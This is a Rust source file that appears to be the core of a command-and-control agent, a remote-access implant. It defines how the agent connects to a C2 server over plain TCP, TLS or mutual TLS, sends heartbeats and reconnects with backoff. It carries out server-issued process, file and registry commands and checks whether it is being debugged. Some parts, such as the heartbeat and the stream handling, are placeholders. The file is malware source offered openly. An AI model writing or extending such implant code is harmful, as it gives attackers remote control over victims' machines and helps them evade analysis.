use agent_hardening::anti_debug;
use agent_modules::{file_manager, monitoring, process_manager, registry_manager};
use crypto::tls::{build_tls_connector, load_certs, load_private_key, TlsError};
use protocol::messages::{Command, Response};
use std::net::SocketAddr;
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::time;
use tokio_rustls::TlsConnector;

/// Configuration for agent connection and reconnection.
#[derive(Clone)]
pub struct ConnectionConfig {
    /// Address of the C2 server (e.g., "127.0.0.1:9000").
    pub server_addr: String,
    /// Interval between heartbeats in seconds (default: 30).
    pub heartbeat_interval: u64,
    /// Initial backoff delay in seconds on reconnect (default: 1).
    pub reconnect_base_delay: u64,
    /// Maximum backoff delay in seconds (default: 300 / 5 minutes).
    pub reconnect_max_delay: u64,
    /// Multiplier applied after each failed reconnect attempt (default: 2).
    pub reconnect_multiplier: f64,
}

impl Default for ConnectionConfig {
    fn default() -> Self {
        Self {
            server_addr: "127.0.0.1:9000".to_string(),
            heartbeat_interval: 30,
            reconnect_base_delay: 1,
            reconnect_max_delay: 300,
            reconnect_multiplier: 2.0,
        }
    }
}

/// Connection mode for the agent.
#[derive(Default, Clone)]
pub enum ConnectionMode {
    /// Connect without TLS (cleartext).
    #[default]
    Plain,
    /// Connect with TLS but no client certificate.
    Tls {
        connector: std::sync::Arc<TlsConnector>,
        server_name: String,
    },
    /// Connect with mTLS (client certificate presented).
    Mtls {
        connector: std::sync::Arc<TlsConnector>,
        server_name: String,
    },
}

pub struct AgentCore {
    pub id: u32,
    pub config: ConnectionConfig,
    /// How this agent connects to the C2.
    pub connection_mode: ConnectionMode,
}

impl AgentCore {
    #[must_use]
    pub fn new(id: u32) -> Self {
        Self {
            id,
            config: ConnectionConfig::default(),
            connection_mode: ConnectionMode::Plain,
        }
    }

    /// Create an agent with a custom connection configuration.
    #[must_use]
    pub fn with_config(id: u32, config: ConnectionConfig) -> Self {
        Self {
            id,
            config,
            connection_mode: ConnectionMode::Plain,
        }
    }

    /// Create an agent that connects using TLS (server-auth only).
    pub fn with_tls(id: u32, ca_cert_path: &str, server_name: &str) -> Result<Self, TlsError> {
        let ca_certs = load_certs(ca_cert_path)?;
        let ca_cert = ca_certs
            .into_iter()
            .next()
            .ok_or_else(|| TlsError::CertParse("CA certificate file is empty".into()))?;
        let connector = build_tls_connector(ca_cert, None, None)?;
        Ok(Self {
            id,
            config: ConnectionConfig::default(),
            connection_mode: ConnectionMode::Tls {
                connector: std::sync::Arc::new(connector),
                server_name: server_name.to_string(),
            },
        })
    }

    /// Create an agent that connects using mTLS (mutual authentication).
    pub fn with_mtls(
        id: u32,
        ca_cert_path: &str,
        client_cert_path: &str,
        client_key_path: &str,
        server_name: &str,
    ) -> Result<Self, TlsError> {
        let ca_certs = load_certs(ca_cert_path)?;
        let ca_cert = ca_certs
            .into_iter()
            .next()
            .ok_or_else(|| TlsError::CertParse("CA certificate file is empty".into()))?;
        let client_certs = load_certs(client_cert_path)?;
        let client_key = load_private_key(client_key_path)?;
        let connector =
            build_tls_connector(ca_cert, Some(client_certs), Some(client_key))?;
        Ok(Self {
            id,
            config: ConnectionConfig::default(),
            connection_mode: ConnectionMode::Mtls {
                connector: std::sync::Arc::new(connector),
                server_name: server_name.to_string(),
            },
        })
    }

    /// Connect to a C2 server at the given address.
    ///
    /// If TLS/mTLS is configured, the TCP stream is wrapped before returning.
    pub async fn connect(&self, addr: &SocketAddr) -> Result<(), Box<dyn std::error::Error>> {
        let stream = TcpStream::connect(addr).await?;
        log::info!("Agent {} connected to {addr}", self.id);

        // Extract the Arc<Connector> and name before the .await boundary.
        let (connector_opt, server_name) = match &self.connection_mode {
            ConnectionMode::Tls {
                connector,
                server_name,
            }
            | ConnectionMode::Mtls {
                connector,
                server_name,
            } => (Some(std::sync::Arc::clone(connector)), Some(server_name.clone())),
            ConnectionMode::Plain => (None, None),
        };

        if let (Some(connector), Some(name_str)) = (connector_opt, server_name) {
            // Use an owned String so ServerName gets 'static lifetime.
            let owned_name: String = name_str;
            let name: rustls_pki_types::ServerName<'static> = owned_name
                .try_into()
                .map_err(|_| "invalid DNS name")?;
            let _tls_stream = connector.connect(name, stream).await?;
            log::info!("TLS handshake completed for agent {}", self.id);
        } else {
            log::info!("Agent {} connected in cleartext mode", self.id);
        }

        Ok(())
    }

    /// Run the agent loop: connect to C2, send heartbeats, and reconnect on failure.
    ///
    /// This is the main entry point for the agent. It retries with exponential
    /// backoff until the connection is established, then runs the heartbeat loop.
    pub async fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
        loop {
            match self.connect_and_run_heartbeats().await {
                Ok(()) => {
                    log::info!("Agent {} disconnected cleanly", self.id);
                }
                Err(e) => {
                    log::error!("Agent {} connection error: {e}", self.id);
                }
            }

            // Reconnect with exponential backoff
            let mut delay = self.config.reconnect_base_delay;
            loop {
                log::info!(
                    "Agent {} reconnecting in {delay}s (max {}s)",
                    self.id,
                    self.config.reconnect_max_delay
                );
                time::sleep(Duration::from_secs(delay)).await;

                match TcpStream::connect(&self.config.server_addr).await {
                    Ok(_stream) => {
                        log::info!("Agent {} reconnected to {}", self.id, self.config.server_addr);
                        break;
                    }
                    Err(e) => {
                        log::warn!(
                            "Agent {} reconnect failed: {e} (will retry in {delay}s)",
                            self.id
                        );
                        delay = (delay as f64 * self.config.reconnect_multiplier).ceil() as u64;
                        if delay > self.config.reconnect_max_delay {
                            delay = self.config.reconnect_max_delay;
                        }
                    }
                }
            }
        }
    }

    /// Connect to the C2 server and run the heartbeat loop.
    async fn connect_and_run_heartbeats(&self) -> Result<(), Box<dyn std::error::Error>> {
        let _stream = TcpStream::connect(&self.config.server_addr).await?;
        log::info!("Agent {} connected to {}", self.id, self.config.server_addr);

        self.run_heartbeat_loop().await
    }

    /// Send heartbeats to the C2 server at the configured interval.
    async fn run_heartbeat_loop(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut interval = time::interval(Duration::from_secs(self.config.heartbeat_interval));
        interval.tick().await; // skip the first immediate tick

        loop {
            interval.tick().await;
            let response = self.heartbeat().await;
            log::info!("Agent {} heartbeat: {response:?}", self.id);
        }
    }

    /// Handle an incoming command from the C2 server.
    pub async fn handle_command(&self, cmd: &Command) -> Option<Response> {
        if anti_debug::is_being_debugged() {
            log::warn!("Agent is being debugged");
        }

        match cmd {
            cmd_ref @ Command::Execute { cmd } => {
                if cmd.starts_with("proc:") {
                    process_manager::execute(cmd_ref).await
                } else if cmd.starts_with("file:") {
                    file_manager::execute(cmd_ref).await
                } else if cmd.starts_with("reg:") {
                    registry_manager::execute(cmd_ref).await
                } else {
                    process_manager::execute(cmd_ref).await
                }
            }
            Command::GetSysInfo => monitoring::get_sysinfo().await,
            Command::Heartbeat => Some(Response::Success),
            _ => None,
        }
    }

    /// Generate a heartbeat response.
    pub async fn heartbeat(&self) -> Response {
        // In a production agent this would send a serialised heartbeat packet
        // over the TCP stream. For now it returns a success response.
        Response::Success
    }
}

#[cfg(test)]
mod tests {
    use super::AgentCore;
    use protocol::messages::{Command, Response};

    #[tokio::test]
    async fn execute_commands_return_module_status() {
        let agent = AgentCore::new(1);
        let response = agent
            .handle_command(&Command::Execute {
                cmd: "proc:request".to_string(),
            })
            .await;

        // After PR #31, process_manager::execute now returns a real
        // error message for unknown sub-commands instead of "not implemented".
        assert!(matches!(response, Some(Response::Failure { .. })));
    }

    #[tokio::test]
    async fn heartbeat_returns_success() {
        let agent = AgentCore::new(1);
        let response = agent.heartbeat().await;
        assert_eq!(response, Response::Success);
    }

    #[test]
    fn default_config_has_reasonable_values() {
        let config = super::ConnectionConfig::default();
        assert_eq!(config.heartbeat_interval, 30);
        assert_eq!(config.reconnect_base_delay, 1);
        assert_eq!(config.reconnect_max_delay, 300);
        assert!((config.reconnect_multiplier - 2.0).abs() < 0.01);
    }

    #[test]
    fn agent_connection_mode_defaults_to_plain() {
        let agent = AgentCore::new(1);
        assert!(matches!(agent.connection_mode, super::ConnectionMode::Plain));
    }
}
